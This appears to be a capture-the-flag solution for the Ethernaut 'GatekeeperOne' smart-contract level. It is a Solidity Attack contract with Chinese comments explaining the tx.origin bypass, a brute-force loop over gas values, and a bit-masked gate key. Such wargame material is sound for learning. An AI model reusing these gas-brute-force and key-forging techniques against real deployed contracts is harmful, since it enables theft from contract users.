//gateOne ：tx.origin是发起交易的地址，msg.sender是调用的地址，这个通过部署合约再调用即可通过
//gateTwo ：gasleft()指的是运行到当前指令还剩余的 gas 量，要能整除 8191。且external call 最低的gas限制是21000 ，所以暴力循环i + 8191 * 3 > 21000 ,成功执行再break
//gateThree()：uint32(uint64(_gateKey)) == uint16(uint64(_gateKey) 需要判断后面的四个字节是 0000FFFF满足
//             uint32(uint64(_gateKey)) != uint64(_gateKey)       判断uint64(_gateKey) 是满足八个字节的 0xFFFFFFFF0000FFFF
//             uint32(uint64(_gateKey)) == uint16(uint160(tx.origin) 需要把tx.origin 转化成匹配的_gateKey，且满足上述需求

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract Attack {

    bytes8 _gateKey = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
    //modifier-one contract address
    GatekeeperOne target = GatekeeperOne(0xa6165bbb69f7e8f3d960220B5F28e990ea5F630D);

    function hack() public returns(uint){
        uint i=0;
        for (i; i < 8191; i++) { 
            //external call limit :at least 21000 gas
            (bool result,) = address(target).call{gas:i + 8191 * 3}(abi.encodeWithSignature("enter(bytes8)", _gateKey));

            if (result) {
                break;
            }
        }
        return i;
    }
}
